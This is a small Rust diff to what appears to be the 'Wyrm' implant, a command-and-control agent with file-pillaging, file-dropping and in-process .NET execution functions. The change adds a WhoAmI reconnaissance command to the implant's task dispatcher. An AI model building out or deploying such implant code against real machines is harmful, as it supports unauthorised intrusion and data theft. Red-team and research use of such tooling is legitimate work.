@@ -33,7 +33,9 @@ use crate::{
     entry::{APPLICATION_RUNNING, IS_IMPLANT_SVC},
     execute::dotnet::execute_dotnet_current_process,
     native::{
-        accounts::{ProcessIntegrityLevel, get_logged_in_username, get_process_integrity_level},
+        accounts::{
+            ProcessIntegrityLevel, get_logged_in_username, get_process_integrity_level, whoami,
+        },
         filesystem::{
             MoveCopyAction, PathParseType, change_directory, dir_listing, drop_file_to_disk,
             move_or_copy_file, pillage, pull_file, rm_from_fs,
@@ -324,8 +326,11 @@ impl Wyrm {
                     let result = Some(execute_dotnet_current_process(&task.metadata));
                     self.push_completed_task(&task, result);
                 }
-                // This should never be received as a task
                 Command::ConsoleMessages => (),
+                Command::WhoAmI => {
+                    let result = whoami();
+                    self.push_completed_task(&task, result);
+                }
             }
         }
     }
